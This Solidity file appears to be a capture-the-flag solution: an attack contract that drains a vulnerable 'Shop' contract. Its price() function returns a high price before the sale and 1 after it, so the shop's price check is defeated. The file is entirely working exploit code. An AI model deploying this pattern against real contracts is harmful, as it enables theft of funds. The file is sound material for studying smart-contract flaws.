// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract ShopAttack is Buyer {
    Shop public s;

    function attack(address target) public {
        s = Shop(target);
        s.buy();
    }

    function price() external view override returns (uint) {
        return s.isSold()?1:101;
    }
}